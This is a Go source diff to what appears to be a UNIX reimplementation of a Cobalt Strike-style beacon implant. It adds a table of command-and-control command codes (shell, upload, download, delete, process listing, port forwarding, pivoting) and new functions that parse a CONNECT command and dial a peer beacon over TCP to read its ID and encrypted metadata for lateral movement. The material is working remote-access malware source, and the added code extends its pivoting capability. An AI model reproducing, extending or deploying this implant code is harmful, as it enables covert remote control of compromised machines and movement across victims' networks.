@@ -13,30 +13,51 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"net"
+	"bufio"
+	"time"
 
 	"github.com/shirou/gopsutil/v3/disk"
 	"github.com/shirou/gopsutil/v3/process"
 )
 
 const (
-	CMD_TYPE_SLEEP        = 4		// IMPLEMENTED 
-	CMD_TYPE_DATA_JITTER  = 6		// TODO
-	CMD_TYPE_CHECKIN	  = 8		// WONTFIX: only required for DNS beacons
-	CMD_TYPE_SHELL        = 78		// IMPLEMENTED
-	CMD_TYPE_UPLOAD_START = 10		// IMPLEMENTED
-	CMD_TYPE_UPLOAD_LOOP  = 67		// IMPLEMENTED
-	CMD_TYPE_DOWNLOAD     = 11		// IMPLEMENTED
-	CMD_TYPE_EXIT         = 3		// IMPLEMENTED
-	CMD_TYPE_CD           = 5		// IMPLEMENTED
-	CMD_TYPE_PWD          = 39		// IMPLEMENTED
-	CMD_TYPE_FILE_BROWSE  = 53		// IMPLEMENTED
-	CMD_TYPE_RM			  = 56		// IMPLEMENTED
-	CMD_TYPE_LIST_PROCESS = 32		// TODO
-	CMD_TYPE_GETUID		  = 27		// IMPLEMENTED
-	CMD_TYPE_CP			  = 73		// IMPLEMENTED
-	CMD_TYPE_MV			  = 74		// IMPLEMENTED
-	CMD_TYPE_IP_CONFIG	  = 48		// TODO
-	CMD_TYPE_DRIVES		  = 55		// IMPLEMENTED
+	CMD_TYPE_SPAWN			= 1		// TODO
+	CMD_TYPE_EXIT        	= 3		// IMPLEMENTED
+	CMD_TYPE_SLEEP        	= 4		// IMPLEMENTED 
+	CMD_TYPE_CD           	= 5		// IMPLEMENTED
+	CMD_TYPE_DATA_JITTER  	= 6		// TODO
+	CMD_TYPE_CHECKIN	  	= 8		// WONTFIX: only required for DNS beacons
+	CMD_TYPE_DLL_INJECT		= 9		// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
+	CMD_TYPE_UPLOAD_START 	= 10	// IMPLEMENTED
+	CMD_TYPE_DOWNLOAD     	= 11	// IMPLEMENTED
+	CMD_TYPE_GETUID		  	= 27	// IMPLEMENTED
+	CMD_TYPE_LIST_PROCESS 	= 32	// IMPLEMENTED
+	CMD_TYPE_RUNAS			= 38	// TODO
+	CMD_TYPE_PWD          	= 39	// IMPLEMENTED
+	CMD_TYPE_JOB_KILL		= 42	// TODO: requires job control to be implemented
+	CMD_TYPE_DLL_INJECT_64	= 43	// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
+	CMD_TYPE_SPAWN_64		= 44	// TODO
+	CMD_TYPE_IP_CONFIG	  	= 48	// TODO
+	CMD_TYPE_LOGIN_USER		= 49	// WONTFIX: ticket forging is not a thing in UNIX afaik
+	CMD_TYPE_PORT_FWD		= 50 	// TODO
+	CMD_TYPE_PORT_FWD_STOP	= 51	// TODO
+	CMD_TYPE_FILE_BROWSE  	= 53	// IMPLEMENTED
+	CMD_TYPE_DRIVES		  	= 55	// IMPLEMENTED
+	CMD_TYPE_RM			  	= 56	// IMPLEMENTED
+	CMD_TYPE_UPLOAD_LOOP  	= 67	// IMPLEMENTED
+	CMD_TYPE_LINK_EXPLICIT	= 68	// TBD, SMB communication if possible
+	CMD_TYPE_CP			  	= 73	// IMPLEMENTED
+	CMD_TYPE_MV			  	= 74	// IMPLEMENTED
+	CMD_TYPE_RUN_UNDER		= 76	// TBD, injection into UNIX processes might be out of scope of this project
+	CMD_TYPE_GET_PRIVS	  	= 77	// TODO
+	CMD_TYPE_SHELL        	= 78	// IMPLEMENTED
+	CMD_TYPE_LOAD_DLL		= 80	// WONTFIX: DLL only applies to windows clients. Maybe enable loading of shared object files?
+	CMD_TYPE_REG_QUERY		= 81	// WONTFIX: No Registry on UNIX
+	CMD_TYPE_PIVOT_LISTEN	= 82	// TBD
+	CMD_TYPE_CONNECT	  	= 86	// TODO
+	CMD_TYPE_INLINE_EXEC	= 95	// WONTFIX: loading assemblies into memory and executing them is not in scope for this project for now
+	// CMD_TYPE_DISCONNECT	  = ??
 
 	BEACON_RSP_OUTPUT_KEYSTROKES	    = 1
 	BEACON_RSP_DOWNLOAD_START	        = 2
@@ -287,6 +308,77 @@ func ListProcesses() []byte {
 	}
 
 	return []byte(sb.String())
+}
+
+func ParseCommandConnect(b []byte) ([]byte, uint16) {
+	// data is 2 Bytes for port, 4 Bytes for Address. 
+	// As there is no data in the buffer apart from that, we just use buf.Len() to get the remainder of available bytes for the address.
+	buf := bytes.NewBuffer(b)
+
+	fmt.Printf("Remaining bytes: %d\n", buf.Len())
+	portRaw := make([]byte, 2)
+	_, err := buf.Read(portRaw)
+	port := ReadShort(portRaw)
+	if err != nil {
+		panic(err)
+	}
+
+	fmt.Printf("Port is %d\n", port)
+
+	fmt.Printf("Remaining bytes: %d\n", buf.Len())
+
+	addr := make([]byte, buf.Len())
+	_, err = buf.Read(addr)
+	if err != nil {
+		panic(err)
+	}
+
+	fmt.Printf("Address is %s\n", addr)
+
+	// return addr, port
+	return addr, port
+}
+
+func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
+
+	dialer := net.Dialer{Timeout: 5*time.Millisecond}
+	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", addr, port))
+	if err != nil {
+		panic(err)
+    }
+
+	reader := bufio.NewReader(conn)
+
+	initialMessage := make([]byte, 4)
+	bytesRead, err := reader.Read(initialMessage)
+	if err != nil {
+		panic(err)
+    }
+	fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, initialMessage)
+
+	message := make([]byte, 140)
+	bytesRead, err = reader.Read(message)
+	if err != nil {
+		panic(err)
+    }
+	trimmedMessage := message[:bytesRead]
+	fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, trimmedMessage)
+
+	// attempt to xor the second message with the first as a key
+	// unmaskedMessage := unmask(util.BytesCombine(initialMessage, trimmedMessage))
+
+	fmt.Printf("Let's assume we start with a beacon ID, which is apparently a LittleEndian UInt32, and therefore 4 bytes long \n")
+	buf := bytes.NewBuffer(trimmedMessage)
+	beaconIdLen := make([]byte, 4)
+	buf.Read(beaconIdLen)
+	beaconId := int(binary.LittleEndian.Uint32(beaconIdLen))
+	fmt.Printf("Beacon ID  %d\n", beaconId)
+
+	// The rest of the payload are 128 bytes, the exact length allowed for RSA decrypt on the team server. Coincidence? I think not!
+	encryptedMetaData := trimmedMessage[4:]
+
+	return beaconId, encryptedMetaData
+
 }
 
 func File_Browse(b []byte) []byte {
